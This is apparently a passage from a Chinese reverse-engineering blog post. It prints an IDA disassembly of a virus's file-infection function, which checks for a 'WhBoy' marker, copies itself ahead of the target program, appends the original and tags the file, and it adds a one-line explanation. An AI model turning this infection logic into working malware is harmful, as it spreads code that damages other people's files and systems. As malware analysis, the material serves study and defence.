<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CODE:0040800C ; Attributes: bp-based frame</span><br><span class="line">CODE:0040800C</span><br><span class="line">CODE:0040800C sub_40800C      proc near               ; CODE XREF: sub_4094A4+A86p</span><br><span class="line">CODE:0040800C                                         ; sub_4094A4+AECp ...</span><br><span class="line">CODE:0040800C</span><br><span class="line">CODE:0040800C var_1F4         = dword ptr -1F4h</span><br><span class="line">CODE:0040800C var_1F0         = dword ptr -1F0h</span><br><span class="line">CODE:0040800C var_1EC         = dword ptr -1ECh</span><br><span class="line">CODE:0040800C var_1E8         = dword ptr -1E8h</span><br><span class="line">CODE:0040800C var_1E4         = dword ptr -1E4h</span><br><span class="line">CODE:0040800C var_1E0         = dword ptr -1E0h</span><br><span class="line">CODE:0040800C var_1DC         = byte ptr -1DCh</span><br><span class="line">CODE:0040800C var_10          = dword ptr -10h</span><br><span class="line">CODE:0040800C var_C           = dword ptr -0Ch</span><br><span class="line">CODE:0040800C var_8           = dword ptr -8</span><br><span class="line">CODE:0040800C var_4           = dword ptr -4</span><br><span class="line">CODE:0040800C</span><br><span class="line">CODE:0040800C                 push    ebp</span><br><span class="line">CODE:0040800D                 mov     ebp, esp</span><br><span class="line">CODE:0040800F                 add     esp, 0FFFFFE0Ch</span><br><span class="line">CODE:00408015                 push    ebx</span><br><span class="line">CODE:00408016                 push    esi</span><br><span class="line">CODE:00408017                 push    edi</span><br><span class="line">CODE:00408018                 xor     edx, edx</span><br><span class="line">CODE:0040801A                 mov     [ebp+var_1F0], edx</span><br><span class="line">CODE:00408020                 mov     [ebp+var_1F4], edx</span><br><span class="line">CODE:00408026                 mov     [ebp+var_1EC], edx</span><br><span class="line">CODE:0040802C                 mov     [ebp+var_1E8], edx</span><br><span class="line">CODE:00408032                 mov     [ebp+var_1E4], edx</span><br><span class="line">CODE:00408038                 mov     [ebp+var_1E0], edx</span><br><span class="line">CODE:0040803E                 mov     [ebp+var_8], edx</span><br><span class="line">CODE:00408041                 mov     [ebp+var_C], edx</span><br><span class="line">CODE:00408044                 mov     [ebp+var_10], edx</span><br><span class="line">CODE:00408047                 mov     [ebp+var_4], eax</span><br><span class="line">CODE:0040804A                 mov     eax, [ebp+var_4]</span><br><span class="line">CODE:0040804D                 call    sub_4040BC</span><br><span class="line">CODE:00408052                 xor     eax, eax</span><br><span class="line">CODE:00408054                 push    ebp</span><br><span class="line">CODE:00408055                 push    offset loc_40827A</span><br><span class="line">CODE:0040805A                 push    dword ptr fs:[eax]</span><br><span class="line">CODE:0040805D                 mov     fs:[eax], esp</span><br><span class="line">CODE:00408060                 xor     eax, eax</span><br><span class="line">CODE:00408062                 push    ebp</span><br><span class="line">CODE:00408063                 push    offset loc_408245</span><br><span class="line">CODE:00408068                 push    dword ptr fs:[eax]</span><br><span class="line">CODE:0040806B                 mov     fs:[eax], esp</span><br><span class="line">CODE:0040806E                 lea     eax, [ebp+var_1E0]</span><br><span class="line">CODE:00408074                 mov     ecx, [ebp+var_4]</span><br><span class="line">CODE:00408077                 mov     edx, offset dword_408290</span><br><span class="line">CODE:0040807C                 call    sub_403F18</span><br><span class="line">CODE:00408081                 mov     eax, [ebp+var_1E0]</span><br><span class="line">CODE:00408087                 mov     edx, offset dword_4082A4</span><br><span class="line">CODE:0040808C                 call    sub_4050F0</span><br><span class="line">CODE:00408091                 lea     edx, [ebp+var_1E4]</span><br><span class="line">CODE:00408097                 mov     eax, [ebp+var_4]</span><br><span class="line">CODE:0040809A                 call    sub_405644</span><br><span class="line">CODE:0040809F                 mov     eax, [ebp+var_1E4]</span><br><span class="line">CODE:004080A5                 call    sub_4078C4</span><br><span class="line">CODE:004080AA                 test    al, al</span><br><span class="line">CODE:004080AC                 jz      short loc_4080BB</span><br><span class="line">CODE:004080AE                 xor     eax, eax</span><br><span class="line">CODE:004080B0                 pop     edx</span><br><span class="line">CODE:004080B1                 pop     ecx</span><br><span class="line">CODE:004080B2                 pop     ecx</span><br><span class="line">CODE:004080B3                 mov     fs:[eax], edx</span><br><span class="line">CODE:004080B6                 jmp     loc_40824F</span><br><span class="line">CODE:004080BB ; ---------------------------------------------------------------------------</span><br><span class="line">CODE:004080BB</span><br><span class="line">CODE:004080BB loc_4080BB:                             ; CODE XREF: sub_40800C+A0j</span><br><span class="line">CODE:004080BB                 call    sub_4027DC</span><br><span class="line">CODE:004080C0                 lea     edx, [ebp+var_1E8]</span><br><span class="line">CODE:004080C6                 xor     eax, eax</span><br><span class="line">CODE:004080C8                 call    sub_40277C</span><br><span class="line">CODE:004080CD                 mov     edx, [ebp+var_1E8]</span><br><span class="line">CODE:004080D3                 mov     eax, [ebp+var_4]</span><br><span class="line">CODE:004080D6                 call    sub_404018</span><br><span class="line">CODE:004080DB                 jnz     short loc_4080EA</span><br><span class="line">CODE:004080DD                 xor     eax, eax</span><br><span class="line">CODE:004080DF                 pop     edx</span><br><span class="line">CODE:004080E0                 pop     ecx</span><br><span class="line">CODE:004080E1                 pop     ecx</span><br><span class="line">CODE:004080E2                 mov     fs:[eax], edx</span><br><span class="line">CODE:004080E5                 jmp     loc_40824F</span><br><span class="line">CODE:004080EA ; ---------------------------------------------------------------------------</span><br><span class="line">CODE:004080EA</span><br><span class="line">CODE:004080EA loc_4080EA:                             ; CODE XREF: sub_40800C+CFj</span><br><span class="line">CODE:004080EA                 lea     eax, [ebp+var_8]</span><br><span class="line">CODE:004080ED                 call    sub_403C44</span><br><span class="line">CODE:004080F2                 lea     edx, [ebp+var_8]</span><br><span class="line">CODE:004080F5                 mov     eax, [ebp+var_4]</span><br><span class="line">CODE:004080F8                 call    sub_407760</span><br><span class="line">CODE:004080FD                 cmp     [ebp+var_8], 0</span><br><span class="line">CODE:00408101                 jnz     short loc_408110</span><br><span class="line">CODE:00408103                 xor     eax, eax</span><br><span class="line">CODE:00408105                 pop     edx</span><br><span class="line">CODE:00408106                 pop     ecx</span><br><span class="line">CODE:00408107                 pop     ecx</span><br><span class="line">CODE:00408108                 mov     fs:[eax], edx</span><br><span class="line">CODE:0040810B                 jmp     loc_40824F</span><br><span class="line">CODE:00408110 ; ---------------------------------------------------------------------------</span><br><span class="line">CODE:00408110</span><br><span class="line">CODE:00408110 loc_408110:                             ; CODE XREF: sub_40800C+F5j</span><br><span class="line">CODE:00408110                 mov     edx, [ebp+var_8]</span><br><span class="line">CODE:00408113                 mov     eax, offset aWhboy ; &quot;WhBoy&quot;</span><br><span class="line">CODE:00408118                 call    sub_4041B4</span><br><span class="line">CODE:0040811D                 test    eax, eax</span><br><span class="line">CODE:0040811F                 jle     short loc_40812E</span><br><span class="line">CODE:00408121                 xor     eax, eax</span><br><span class="line">CODE:00408123                 pop     edx</span><br><span class="line">CODE:00408124                 pop     ecx</span><br><span class="line">CODE:00408125                 pop     ecx</span><br><span class="line">CODE:00408126                 mov     fs:[eax], edx</span><br><span class="line">CODE:00408129                 jmp     loc_40824F</span><br><span class="line">CODE:0040812E ; ---------------------------------------------------------------------------</span><br><span class="line">CODE:0040812E</span><br><span class="line">CODE:0040812E loc_40812E:                             ; CODE XREF: sub_40800C+113j</span><br><span class="line">CODE:0040812E                 push    80h             ; dwFileAttributes</span><br><span class="line">CODE:00408133                 mov     eax, [ebp+var_4]</span><br><span class="line">CODE:00408136                 call    sub_4040CC</span><br><span class="line">CODE:0040813B                 mov     ebx, eax</span><br><span class="line">CODE:0040813D                 push    ebx             ; lpFileName</span><br><span class="line">CODE:0040813E                 call    SetFileAttributesA</span><br><span class="line">CODE:00408143                 push    1               ; dwMilliseconds</span><br><span class="line">CODE:00408145                 call    Sleep</span><br><span class="line">CODE:0040814A                 push    0               ; bFailIfExists</span><br><span class="line">CODE:0040814C                 push    ebx             ; lpNewFileName</span><br><span class="line">CODE:0040814D                 lea     edx, [ebp+var_1EC]</span><br><span class="line">CODE:00408153                 xor     eax, eax</span><br><span class="line">CODE:00408155                 call    sub_40277C</span><br><span class="line">CODE:0040815A                 mov     eax, [ebp+var_1EC]</span><br><span class="line">CODE:00408160                 call    sub_4040CC</span><br><span class="line">CODE:00408165                 push    eax             ; lpExistingFileName</span><br><span class="line">CODE:00408166                 call    CopyFileA</span><br><span class="line">CODE:0040816B                 test    eax, eax</span><br><span class="line">CODE:0040816D                 jnz     short loc_40817C</span><br><span class="line">CODE:0040816F                 xor     eax, eax</span><br><span class="line">CODE:00408171                 pop     edx</span><br><span class="line">CODE:00408172                 pop     ecx</span><br><span class="line">CODE:00408173                 pop     ecx</span><br><span class="line">CODE:00408174                 mov     fs:[eax], edx</span><br><span class="line">CODE:00408177                 jmp     loc_40824F</span><br><span class="line">CODE:0040817C ; ---------------------------------------------------------------------------</span><br><span class="line">CODE:0040817C</span><br><span class="line">CODE:0040817C loc_40817C:                             ; CODE XREF: sub_40800C+161j</span><br><span class="line">CODE:0040817C                 push    offset dword_4082C8</span><br><span class="line">CODE:00408181                 lea     edx, [ebp+var_1F0]</span><br><span class="line">CODE:00408187                 mov     eax, [ebp+var_4]</span><br><span class="line">CODE:0040818A                 call    sub_405644</span><br><span class="line">CODE:0040818F                 push    [ebp+var_1F0]</span><br><span class="line">CODE:00408195                 push    offset dword_4082D8</span><br><span class="line">CODE:0040819A                 push    offset dword_4082E8</span><br><span class="line">CODE:0040819F                 mov     eax, [ebp+var_8]</span><br><span class="line">CODE:004081A2                 call    sub_403ECC</span><br><span class="line">CODE:004081A7                 lea     edx, [ebp+var_1F4]</span><br><span class="line">CODE:004081AD                 call    sub_40587C</span><br><span class="line">CODE:004081B2                 push    [ebp+var_1F4]</span><br><span class="line">CODE:004081B8                 push    offset dword_4082F4</span><br><span class="line">CODE:004081BD                 lea     eax, [ebp+var_10]</span><br><span class="line">CODE:004081C0                 mov     edx, 6</span><br><span class="line">CODE:004081C5                 call    sub_403F8C</span><br><span class="line">CODE:004081CA                 lea     eax, [ebp+var_C]</span><br><span class="line">CODE:004081CD                 mov     edx, [ebp+var_8]</span><br><span class="line">CODE:004081D0                 call    sub_403CDC</span><br><span class="line">CODE:004081D5                 mov     edx, [ebp+var_4]</span><br><span class="line">CODE:004081D8                 lea     eax, [ebp+var_1DC]</span><br><span class="line">CODE:004081DE                 call    sub_402AD8</span><br><span class="line">CODE:004081E3                 mov     eax, ds:off_40E2BC</span><br><span class="line">CODE:004081E8                 mov     byte ptr [eax], 2</span><br><span class="line">CODE:004081EB                 lea     eax, [ebp+var_1DC]</span><br><span class="line">CODE:004081F1                 call    sub_402874</span><br><span class="line">CODE:004081F6                 call    sub_402614</span><br><span class="line">CODE:004081FB                 mov     edx, [ebp+var_C]</span><br><span class="line">CODE:004081FE                 lea     eax, [ebp+var_1DC]</span><br><span class="line">CODE:00408204                 call    sub_404260</span><br><span class="line">CODE:00408209                 call    sub_402B88</span><br><span class="line">CODE:0040820E                 call    sub_402614</span><br><span class="line">CODE:00408213                 mov     edx, [ebp+var_10]</span><br><span class="line">CODE:00408216                 lea     eax, [ebp+var_1DC]</span><br><span class="line">CODE:0040821C                 call    sub_404260</span><br><span class="line">CODE:00408221                 call    sub_402B88</span><br><span class="line">CODE:00408226                 call    sub_402614</span><br><span class="line">CODE:0040822B                 lea     eax, [ebp+var_1DC]</span><br><span class="line">CODE:00408231                 call    sub_402C48</span><br><span class="line">CODE:00408236                 call    sub_402614</span><br><span class="line">CODE:0040823B                 xor     eax, eax</span><br><span class="line">CODE:0040823D                 pop     edx</span><br><span class="line">CODE:0040823E                 pop     ecx</span><br><span class="line">CODE:0040823F                 pop     ecx</span><br><span class="line">CODE:00408240                 mov     fs:[eax], edx</span><br><span class="line">CODE:00408243                 jmp     short loc_40824F</span><br></pre></td></tr></table></figure>

<p>病毒首先将目标文件读取到内存中，并获取其文件名和大小，其次，将自身文件复制到目标文件前，并追加目标程序的原始文件，最后加入标记。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>C/C++</category>
        <category>技术应用</category>
      </categories>
      <tags>
        <tag>-逆向 -C语言</tag>
      </tags>
  </entry>
</search>
